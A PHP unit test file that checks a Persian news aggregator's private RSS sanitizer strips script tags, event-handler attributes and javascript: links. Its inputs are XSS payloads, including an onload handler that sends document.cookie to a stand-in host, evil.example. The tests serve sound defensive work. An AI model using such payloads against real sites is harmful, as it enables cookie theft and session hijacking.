<?php

namespace Tests\Unit\Services;

use App\Services\PersianNewsAggregatorService;
use ReflectionClass;
use Tests\TestCase;

/**
 * ✅ Final Pre-Production Audit — Security: cleanRssContent() (متد private
 * که محتوای فیدهای RSS خارجیِ غیرقابل‌اعتماد را قبل از ذخیره پاکسازی
 * می‌کند) قبلاً فقط <script>/<style>/<iframe> را حذف می‌کرد — بردارهای
 * XSS مبتنی بر attribute (onerror، onload، href="javascript:...") را
 * نمی‌گرفت. این تست‌ها مستقیماً (از طریق Reflection، چون متد private
 * است و پابلیک‌کردنش برای این تست ارزشی نداشت) رفتار پاکسازی‌شده را
 * تأیید می‌کنند — بدون نیاز به mock کردن کل پایپ‌لاین SimplePie.
 */
class PersianNewsAggregatorServiceSanitizationTest extends TestCase
{
    private function invokeCleanRssContent(string $content): string
    {
        $service = new PersianNewsAggregatorService();
        $method = (new ReflectionClass($service))->getMethod('cleanRssContent');
        $method->setAccessible(true);

        return $method->invoke($service, $content);
    }

    public function test_strips_script_and_style_and_iframe_as_before(): void
    {
        $dirty = '<p>سلام</p><script>alert(1)</script><style>body{}</style><iframe src="x"></iframe>';
        $clean = $this->invokeCleanRssContent($dirty);

        $this->assertStringNotContainsString('<script', $clean);
        $this->assertStringNotContainsString('<style', $clean);
        $this->assertStringNotContainsString('<iframe', $clean);
        $this->assertStringContainsString('<p>سلام</p>', $clean);
    }

    public function test_strips_onerror_event_handler_attribute(): void
    {
        $dirty = '<img src="x.jpg" onerror="alert(document.cookie)">';
        $clean = $this->invokeCleanRssContent($dirty);

        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringContainsString('src="x.jpg"', $clean);
    }

    public function test_strips_onload_event_handler_with_single_quotes(): void
    {
        $dirty = "<body onload='fetch(\"https://evil.example/steal?c=\"+document.cookie)'>";
        $clean = $this->invokeCleanRssContent($dirty);

        $this->assertStringNotContainsString('onload', $clean);
    }

    public function test_neutralizes_javascript_href_scheme(): void
    {
        $dirty = '<a href="javascript:alert(1)">کلیک کنید</a>';
        $clean = $this->invokeCleanRssContent($dirty);

        $this->assertStringNotContainsString('javascript:', $clean);
    }

    public function test_normal_content_with_legitimate_links_and_images_is_preserved(): void
    {
        $normal = '<p>متن خبر</p><img src="https://example.com/a.jpg" alt="x"><a href="https://example.com">لینک</a>';
        $clean = $this->invokeCleanRssContent($normal);

        $this->assertSame($normal, $clean);
    }
}
